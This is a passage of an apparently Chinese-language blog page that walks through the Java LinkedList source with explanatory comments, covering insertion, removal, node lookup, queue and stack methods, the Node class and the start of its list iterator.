class="comment">//获取被插入元素succ的前指针元素：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; pred = succ.prev;</span><br><span class="line">        <span class="comment">//创建新增元素节点，前指针 和 后指针分别指向对应元素：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(pred, e, succ);</span><br><span class="line">        succ.prev = newNode;</span><br><span class="line">        <span class="comment">//succ的前指针元素可能为null，为null的话说明succ是头结点，则把新建立的结点置为头结点：</span></span><br><span class="line">        <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//succ前指针不为null，则将前指针的结点的后指针指向新节点：</span></span><br><span class="line">            pred.next = newNode;</span><br><span class="line">        <span class="comment">//长度+1</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//移除首个结点：如果集合还没有元素则报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="comment">//首节点为null，则抛出异常；</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="keyword">return</span> unlinkFirst(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除LinkedList的头结点：removeFirst()方法调用</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> E <span class="title">unlinkFirst</span><span class="params">(java.util.LinkedList.Node&lt;E&gt; f)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//f为头结点：获取头结点元素E</span></span><br><span class="line">        <span class="keyword">final</span> E element = f.item;</span><br><span class="line">        <span class="comment">//获取头结点的尾指针结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; next = f.next;</span><br><span class="line">        <span class="comment">//将头结点元素置为null：</span></span><br><span class="line">        f.item = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//头结点尾指针置为null：</span></span><br><span class="line">        f.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//将头结点的尾指针指向的结点next置为first</span></span><br><span class="line">        first = next;</span><br><span class="line">        <span class="comment">//尾指针指向结点next为null的话，就将尾结点也置为null（LinkedList中只有一个元素时出现）</span></span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">            last = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//将尾指针指向结点next的 前指针置为null；</span></span><br><span class="line">            next.prev = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 长度减1</span></span><br><span class="line">        size--;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//返回被删除的元素：</span></span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//移除最后一个结点：如果集合还没有元素则报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取最后一个结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="comment">//删除尾结点：</span></span><br><span class="line">        <span class="keyword">return</span> unlinkLast(l);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除LinkedList的尾结点：removeLast()方法调用</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> E <span class="title">unlinkLast</span><span class="params">(java.util.LinkedList.Node&lt;E&gt; l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> E element = l.item;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; prev = l.prev;</span><br><span class="line">        l.item = <span class="keyword">null</span>;</span><br><span class="line">        l.prev = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">        last = prev;</span><br><span class="line">        <span class="keyword">if</span> (prev == <span class="keyword">null</span>)</span><br><span class="line">            first = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            prev.next = <span class="keyword">null</span>;</span><br><span class="line">        size--;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除LinkedList中的元素，可以删除为null的元素，逐个遍历LinkedList的元素；</span></span><br><span class="line">    <span class="comment">//重复元素只删除第一个：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果删除元素为null：</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x.item == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    unlink(x);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果删除元素不为null：</span></span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(x.item)) &#123;</span><br><span class="line">                    unlink(x);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//移除LinkedList结点：remove()方法中调用</span></span><br><span class="line">    <span class="function">E <span class="title">unlink</span><span class="params">(java.util.LinkedList.Node&lt;E&gt; x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取被删除结点的元素E：</span></span><br><span class="line">        <span class="keyword">final</span> E element = x.item;</span><br><span class="line">        <span class="comment">//获取被删除元素的后指针结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; next = x.next;</span><br><span class="line">        <span class="comment">//获取被删除元素的前指针结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; prev = x.prev;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//被删除结点的 前结点为null的话：</span></span><br><span class="line">        <span class="keyword">if</span> (prev == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//将后指针指向的结点置为头结点</span></span><br><span class="line">            first = next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//前置结点的  尾结点指向被删除的next结点；</span></span><br><span class="line">            prev.next = next;</span><br><span class="line">            <span class="comment">//被删除结点前指针置为null:</span></span><br><span class="line">            x.prev = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对尾结点同样处理：</span></span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            last = prev;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            next.prev = prev;</span><br><span class="line">            x.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        x.item = <span class="keyword">null</span>;</span><br><span class="line">        size--;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到首个结点：集合没有元素报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取first结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="keyword">return</span> f.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到最后一个结点：集合没有元素报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取last结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="keyword">return</span> l.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断obj 是否存在：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> indexOf(o) != -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//LinkedList长度：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加集合：从最后size所在的index开始：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addAll(size, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//LinkedList添加集合：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查角标是否正确：</span></span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        Object[] a = c.toArray();</span><br><span class="line">        <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">        <span class="keyword">if</span> (numNew == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; pred, succ;</span><br><span class="line">        <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">            succ = <span class="keyword">null</span>;</span><br><span class="line">            pred = last;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            succ = node(index);</span><br><span class="line">            pred = succ.prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Object o : a) &#123;</span><br><span class="line">            E e = (E) o;</span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(pred, e, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">                first = newNode;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pred.next = newNode;</span><br><span class="line">            pred = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (succ == <span class="keyword">null</span>) &#123;</span><br><span class="line">            last = pred;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pred.next = succ;</span><br><span class="line">            succ.prev = pred;</span><br><span class="line">        &#125;</span><br><span class="line">        size += numNew;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清空LinkedList：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历LinedList集合：</span></span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">            <span class="comment">//将每个结点的前指针 尾指针  元素都置为null：</span></span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; next = x.next;</span><br><span class="line">            x.item = <span class="keyword">null</span>;</span><br><span class="line">            x.next = <span class="keyword">null</span>;</span><br><span class="line">            x.prev = <span class="keyword">null</span>;</span><br><span class="line">            x = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//头尾结点 都置为null：</span></span><br><span class="line">        first = last = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//长度置为0</span></span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//操作数+1：</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取相应角标的元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查角标是否正确：</span></span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">//获取角标所属结点的 元素值：</span></span><br><span class="line">        <span class="keyword">return</span> node(index).item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置对应角标的元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; x = node(index);</span><br><span class="line">        E oldVal = x.item;</span><br><span class="line">        x.item = element;</span><br><span class="line">        <span class="keyword">return</span> oldVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除对应角标的元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="keyword">return</span> unlink(node(index));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取对应角标所属于的结点：</span></span><br><span class="line">    java.util.LinkedList.<span class="function">Node&lt;E&gt; <span class="title">node</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//位运算：如果位置索引小于列表长度的一半，从前面开始遍历；否则，从后面开始遍历；</span></span><br><span class="line">        <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; x = first;</span><br><span class="line">            <span class="comment">//从头结点开始遍历：遍历的长度就是index的长度，获取对应的index的元素</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">                x = x.next;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//从集合尾结点遍历：</span></span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; x = last;</span><br><span class="line">            <span class="comment">//同样道理：</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">                x = x.prev;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左移相当于*2，只是要注意边界问题。如char a = 65； a&lt;&lt;1 按照*2来算为130;</span></span><br><span class="line">    <span class="comment">// 但有符号char的取值范围-128~127，已经越界，多超出了3个数值，</span></span><br><span class="line">    <span class="comment">// 所以从-128算起的第三个数值-126才是a&lt;&lt;1的正确结果。</span></span><br><span class="line">    <span class="comment">//而右移相当于除以2，只是要注意移位比较多的时候结果会趋近去一个非常小的数，如上面结果中的-1，0。</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isElementIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断传入的index是否正确：</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isPositionIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">outOfBoundsMsg</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Index: &quot;</span>+index+<span class="string">&quot;, Size: &quot;</span>+size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkElementIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isElementIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查传入的角标 是否正确：</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkPositionIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//必须大于0 ，并且不能大于当前size：</span></span><br><span class="line">        <span class="keyword">if</span> (!isPositionIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x.item == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(x.item))</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = size;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = last; x != <span class="keyword">null</span>; x = x.prev) &#123;</span><br><span class="line">                index--;</span><br><span class="line">                <span class="keyword">if</span> (x.item == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = last; x != <span class="keyword">null</span>; x = x.prev) &#123;</span><br><span class="line">                index--;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(x.item))</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取第一个元素，不存在则抛异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">element</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队，获取第一个元素，不出队列，只是获取</span></span><br><span class="line">    <span class="comment">// 队列先进先出；不存在不抛异常，返回null</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取头结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="comment">//存在获取头结点元素，不存在返回null</span></span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : f.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队，并移除第一个元素；不存在不抛异常。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">poll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : unlinkFirst(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（删除第一个结点），如果不存在会抛出异常而不是返回null，存在的话会返回值并移除这个元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> removeFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队(插入最后一个结点)从最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> add(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队（插入头结点），始终返回true</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offerFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        addFirst(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队（插入尾结点），始终返回true</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offerLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        addLast(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从前端），获得第一个元素，不存在会返回null，不会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peekFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : f.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从后端），获得最后一个元素，不存在会返回null，不会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peekLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">return</span> (l == <span class="keyword">null</span>) ? <span class="keyword">null</span> : l.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从前端），获得第一个元素，不存在会返回null，会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pollFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : unlinkFirst(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从后端），获得最后一个元素，不存在会返回null，会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pollLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">return</span> (l == <span class="keyword">null</span>) ? <span class="keyword">null</span> : unlinkLast(l);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入栈，从前面添加  栈 后进先出</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        addFirst(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出栈，返回栈顶元素，从前面移除（会删除）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> removeFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//节点的数据结构，包含前后节点的引用和当前节点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">//结点元素：</span></span><br><span class="line">        E item;</span><br><span class="line">        <span class="comment">//结点后指针</span></span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; next;</span><br><span class="line">        <span class="comment">//结点前指针</span></span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; prev;</span><br><span class="line"></span><br><span class="line">        Node(java.util.LinkedList.Node&lt;E&gt; prev, E element, java.util.LinkedList.Node&lt;E&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.item = element;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">            <span class="keyword">this</span>.prev = prev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//迭代器：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title">listIterator</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> java.util.LinkedList.ListItr(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">ListItr</span> <span class="keyword">implements</span> <span class="title">ListIterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> java.util.LinkedList.Node&lt;E&gt; lastReturned = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">private</span> java.util.LinkedList.Node&lt;E&gt; next;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> nextIndex;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line"></span><br><span class="line">        ListItr(<span class="keyword">int</span> index) &#123;</span><br><span class="line">            next = (index == size) ? <span class="keyword">null</span> : node(index);</span><br><span class="line">            nextIndex = index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &lt; size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (!hasNext())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line"></span><br><span class="line">            lastReturned = next;</span><br><span class="line">            next = next.next;</span><br><span class="line">            nextIndex++;</span><br><span class="line">            <span class="keyword">return</span> lastReturned.item;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span 